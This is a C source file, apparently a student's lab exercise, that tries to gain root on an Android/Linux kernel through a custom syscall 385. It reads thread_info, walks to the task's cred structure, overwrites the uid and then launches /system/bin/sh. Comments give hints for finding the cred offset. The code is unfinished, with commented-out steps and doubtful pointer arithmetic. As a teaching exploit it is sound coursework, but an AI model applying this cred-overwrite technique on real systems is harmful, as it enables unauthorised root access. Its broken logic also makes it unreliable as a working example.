#include <stdio.h>
//#include <unistd.h>
#include <asm/thread_info.h>
#include <linux/sched.h>
#include <stdint.h>
//struct thread_info;
//struct task_struct;
//struct cred;
void runExploit() {
    // First, locate thread info using provided system call. Check kernel source code.
    //get poijter to thread_info
    int data = 2;
    char* th1 = syscall(385,4,NULL);
    syscall(385, 0, 0);
    //calculate the offset to addr_limit in thread info
   // int addr_limit = th1 ; //point 

   // syscall(385, 1, data);
   

    //syscall(385, 2, addr_limit);

    data = 1;
    //syscall(385, 1, 1);
    
    //dereference the pointer to thread_info->task to get the pointer to task_struct
    //syscall(385, 0, 0);
    char* task = th1 + 8;

    syscall(385, 1, 2);
    syscall(385, 2, task);
    char* cred = syscall(385, 3, 0);
    syscall(385, 0, 0);

    cred = cred + 728;
    syscall(385, 1, 2);
    syscall(385, 2, cred);
    char* uid = syscall(385, 3, 0);
    syscall(385, 0, 0);

    uid = uid + 4 + 0 - 8;
    const int LIMIT = 257;
    for(int i = 1; i < LIMIT; i++){
        if(i == LIMIT - 1){
            syscall(385, 2, uid);
        }
        syscall(385, 1, i);
    }



    // syscall(385, 1, 1);
    // syscall(385, 2, uid);
    // syscall(385, 1, 2);
    
   

    //void* task = th1;
    //printf("%d, %d", sizeof(unsigned long), int);
    
    // Next, you need to find thread_info->task->cred
    //
    // There are three ways to do it:
    // 1.  Read kernel source code and compute the exact offset. 
    //     You will need to look at the .config file under kernel dir to resolve some macros
    // 2.  Use GDB to inspect the kernel stack and find what is the relationship between thread_info and thread_info->task->cred.
    // 3.  Scan from thread_info->task to find the location of cred field
    //     HINT: here are some conditions to help: 
    //         task->cpu_timers[i] >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->cpu_timers[i]->next == task->cpu_timers[i]->prev (Because we never set any cpu timer)
    //         task->cpu_timers[i]->next >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->real_cred == task->cred (Because we never used seteuid() system call)
    //         task->cred->uid == getuid()
    
    // Finally, you will need to rewrite the cred struct and give your process highest privilege
    return;
}

void test(){
    char* th1 = syscall(385,4,NULL);
    syscall(385, 0, 0);
    //calculate the offset to addr_limit in thread info
   // int addr_limit = th1 ; //point 

   // syscall(385, 1, data);
   

    //syscall(385, 2, addr_limit);

    
    //syscall(385, 1, 1);
    
    //dereference the pointer to thread_info->task to get the pointer to task_struct
    //syscall(385, 0, 0);
    char* task = th1 + 8;

    syscall(385, 1, 2);
    syscall(385, 2, task);
    char* cred = syscall(385, 3, 0);
    syscall(385, 0, 0);

}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());

    // The exploit itself
    runExploit();
    //test();
    // If the exploit is successful, getuid() should return zero.
    fprintf(stderr, "getuid() = %d\n", getuid());

    if (getuid() == 0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/system/bin/sh", NULL};
        execv("/system/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
